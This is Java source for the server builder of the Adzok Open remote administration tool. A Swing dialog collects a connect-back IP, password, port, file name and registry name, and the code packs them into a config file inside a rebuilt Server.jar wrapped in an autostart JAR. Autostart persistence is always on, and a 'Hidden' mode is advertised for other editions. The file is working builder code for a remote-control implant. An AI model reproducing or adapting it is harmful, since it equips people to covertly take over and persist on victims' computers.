
/**
 *
 * @author AngelCruel
 */
import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.jar.*;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.zip.ZipEntry;
import javax.swing.*;
import javax.swing.border.LineBorder;
import javax.swing.border.TitledBorder;

public class MakeJar extends JFrame implements ActionListener {

    JPanel panelConf, botones;
    JButton aceptar, cancelar;
    JLabel ip, contrasena, contrasena2, puerto, nombre, entrada;
    JTextField tip, tpuerto, tnombre, tentrada;
    JPasswordField tcontrasena, tcontrasena2;
    String[] string = new String[5];
    JTabbedPane PanelList;
    JCheckBox checkHidden;
    JCheckBox checkInicio;
    JButton botonlink;

    public MakeJar() {
    	setIconImage(new ImageIcon(getClass().getResource("resources/icono.png")).getImage());
        setTitle("Build Server / Adzok Open");
        setSize(440, 450);
        setResizable(false);
        setLocationRelativeTo(null);
        
        PanelList = new JTabbedPane();
        TitledBorder border = new TitledBorder(new LineBorder(Color.black), "", TitledBorder.RIGHT, TitledBorder.BOTTOM);

        panelConf = new JPanel(new GridLayout(7, 2, 15, 15));
        panelConf.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));

        ip = new JLabel("IP/DNS:");
        ip.setFont(new Font("Serif", Font.BOLD, 20));
        panelConf.add(ip);
        tip = new JTextField(30);
        tip.setText("127.0.0.1");
        panelConf.add(tip);

        contrasena = new JLabel("Password:");
        contrasena.setFont(new Font("Serif", Font.BOLD, 20));
        panelConf.add(contrasena);
        tcontrasena = new JPasswordField(30);
        panelConf.add(tcontrasena);

        contrasena2 = new JLabel("Retype Password:");
        contrasena2.setFont(new Font("Serif", Font.BOLD, 20));
        panelConf.add(contrasena2);
        tcontrasena2 = new JPasswordField(30);
        panelConf.add(tcontrasena2);

        puerto = new JLabel("Port:");
        puerto.setFont(new Font("Serif", Font.BOLD, 20));
        panelConf.add(puerto);
        tpuerto = new JTextField(30);
        tpuerto.setText("7777");
        panelConf.add(tpuerto);

        FlowLayout f = new FlowLayout();
        f.setAlignment(FlowLayout.CENTER);
        f.setHgap(20);
        botones = new JPanel(f);
        aceptar = new JButton("Accept");
        aceptar.addActionListener(this);
        botones.add(aceptar);
        cancelar = new JButton("Cancel");
        cancelar.addActionListener(this);
        botones.add(cancelar);
        add(botones, BorderLayout.SOUTH);

        PanelList.add("Configuration", panelConf);

        JPanel panelInicio = new JPanel(new GridLayout(8, 1, 15, 15));
        panelInicio.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));
        checkInicio = new JCheckBox("Autostart");
        checkInicio.setEnabled(false);
        checkInicio.setSelected(true);
        panelInicio.add(checkInicio);
        nombre = new JLabel("File Name:");
        nombre.setFont(new Font("Serif", Font.BOLD, 20));
        panelInicio.add(nombre);
        tnombre = new JTextField(30);
        panelInicio.add(tnombre);
        entrada = new JLabel("Registry Name:");
        entrada.setFont(new Font("Serif", Font.BOLD, 20));
        panelInicio.add(entrada);
        tentrada = new JTextField(30);
        panelInicio.add(tentrada);
        
        
        PanelList.add("Autostart", panelInicio);

        JPanel panelhidden = new JPanel();
        panelhidden.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));
        panelhidden.setLayout(new BoxLayout(panelhidden, BoxLayout.Y_AXIS));
        checkHidden = new JCheckBox("Modo Oculto");
        checkHidden.setEnabled(false);
        checkHidden.setAlignmentX(JCheckBox.CENTER_ALIGNMENT);
        panelhidden.add(checkHidden);
        panelhidden.add(Box.createVerticalGlue());
        
        
        JPanel panel = new JPanel(new GridLayout(4, 1, 10, 10));
        JLabel label = new JLabel("Options \"Hidden\" is only available", JLabel.CENTER);
        label.setFont(new Font("Serif", Font.BOLD, 18));
        panel.add(label);
        JLabel label2 = new JLabel("in Adzok Pro and Adzok Free", JLabel.CENTER);
        label2.setFont(new Font("Serif", Font.BOLD, 18));
        panel.add(label2);
        JLabel label3 = new JLabel("for more information visit:", JLabel.CENTER);
        label3.setFont(new Font("Serif", Font.BOLD, 18));
        panel.add(label3);
        botonlink = new JButton("<html><a href=\"http://adzok.com\">http://adzok.com</a></html>");
        botonlink.setFont(new Font("Serif", Font.PLAIN, 18));
        botonlink.setBorderPainted(false);
        botonlink.setOpaque(false);
        botonlink.setFocusable(false);
        botonlink.setCursor(Cursor.getPredefinedCursor(Cursor.HAND_CURSOR));
        botonlink.addActionListener(this);
        botonlink.setContentAreaFilled(false);
        panel.add(botonlink);

        panel.setBorder(BorderFactory.createTitledBorder(new LineBorder(Color.black), ""));
        panelhidden.add(panel);
        
        PanelList.add("Hidden", panelhidden);

        add(PanelList);
        setVisible(true);
    }

    public void Make() {
        JarInputStream jarIn = null;
        JarInputStream jarIn2 = null;
        try {
            File temp = File.createTempFile("Autostart", ".jar");
            InputStream ist = getClass().getResourceAsStream("/Autostart.jar");
            FileOutputStream archivoDestino = new FileOutputStream(temp);
            byte[] buffer = new byte[512 * 1024];
            int nbLectura;
            while ((nbLectura = ist.read(buffer)) != -1) {
                archivoDestino.write(buffer, 0, nbLectura);
            }
            jarIn = new JarInputStream(new FileInputStream(temp));
            byte[] buf = new byte[4096];
            JarEntry entry;
            File temp2 = File.createTempFile("Server", ".jar");
            FileOutputStream archivoDestino2 = new FileOutputStream(temp2);
            while ((entry = jarIn.getNextJarEntry()) != null) {
                if ("Server.jar".equals(entry.getName())) {
                    int read;
                    while ((read = jarIn.read(buf)) != -1) {
                        archivoDestino2.write(buf, 0, read);
                    }
                }
            }
            jarIn2 = new JarInputStream(new FileInputStream(temp2));

            Manifest manifest = new Manifest();
            manifest = jarIn2.getManifest();
            File jartemp = File.createTempFile("PreServer", ".jar");
            JarOutputStream jarOut = new JarOutputStream(new FileOutputStream(jartemp), manifest);
            while ((entry = jarIn2.getNextJarEntry()) != null) {
                if ("META-INF/MANIFEST.MF".equals(entry.getName())) {
                    continue;
                }
                jarOut.putNextEntry(entry);
                int read;
                while ((read = jarIn2.read(buf)) != -1) {
                    jarOut.write(buf, 0, read);
                }
                jarOut.closeEntry();
            }

            File testfile = new File("Datos.txt");
            JarEntry jarEntry = new JarEntry(testfile.getPath());
            jarOut.putNextEntry(jarEntry);

            String a = "";
            for (int i = 0; i < 5; i++) {
                a = a.concat(string[i]);
                if (i < 4) {
                    a = a.concat("\r\n");
                }
            }

            int fin = a.length();
            int i = 0;
            while (i < fin) {
                jarOut.write(a.charAt(i));
                i++;
            }
            jarOut.closeEntry();
            jarOut.flush();
            jarOut.close();

            jarIn = new JarInputStream(new FileInputStream(temp));
            Manifest manifest2 = new Manifest();
            manifest2 = jarIn.getManifest();
            JarOutputStream jarOut2 = new JarOutputStream(new FileOutputStream("Server.jar"), manifest2);
            while ((entry = jarIn.getNextJarEntry()) != null) {
                if ("META-INF/MANIFEST.MF".equals(entry.getName()) || "Server.jar".equals(entry.getName())) {
                    continue;
                }
                jarOut2.putNextEntry(entry);
                int read;
                while ((read = jarIn.read(buf)) != -1) {
                    jarOut2.write(buf, 0, read);
                }
                jarOut2.closeEntry();
            }

            BufferedInputStream is = new BufferedInputStream(new FileInputStream(jartemp));
            jarOut2.putNextEntry(new ZipEntry(new File("Server.jar").getPath()));
            int read;
            while ((read = is.read(buf)) != -1) {
                jarOut2.write(buf, 0, read);
            }
            jarOut2.closeEntry();

            jarOut2.flush();
            jarOut2.close();
            jarIn.close();
            jarIn2.close();
        } catch (Exception ex) {
            Logger.getLogger(MakeJar.class.getName()).log(Level.SEVERE, null, ex);
        } finally {
            try {
                jarIn.close();
                jarIn2.close();
            } catch (IOException ex) {
                Logger.getLogger(MakeJar.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        if (e.getSource() == aceptar) {
            if (tcontrasena.getText().equals(tcontrasena2.getText())) {
                if (tnombre.getText().equals("") || tentrada.getText().equals("")) {
                    JOptionPane.showMessageDialog(this, "You must entering a File Name\n and a Registry Name", "Error entering data", JOptionPane.INFORMATION_MESSAGE);
                } else {
                    string[0] = tip.getText();
                    string[1] = tcontrasena.getText();
                    string[2] = tpuerto.getText();
                    string[3] = tnombre.getText();
                    string[4] = tentrada.getText();
                    Make();
                    setVisible(false);
                    JOptionPane.showMessageDialog(this, "Server created successfully\nNOTA: Server for Mac OS will only be available in Adzok Pro", "Info", JOptionPane.INFORMATION_MESSAGE);
                }
            } else {
                JOptionPane.showMessageDialog(this, "Entered passwords are not equal", "Error entering data", JOptionPane.INFORMATION_MESSAGE);
            }
        }
        if (e.getSource() == cancelar) {
            setVisible(false);
        }
        if (e.getSource() == botonlink) {
            try {
                Desktop.getDesktop().browse(new URI("http://adzok.com"));
            } catch (IOException ex) {
                Logger.getLogger(cliente.class.getName()).log(Level.SEVERE, null, ex);
            } catch (URISyntaxException ex) {
                Logger.getLogger(cliente.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }
}
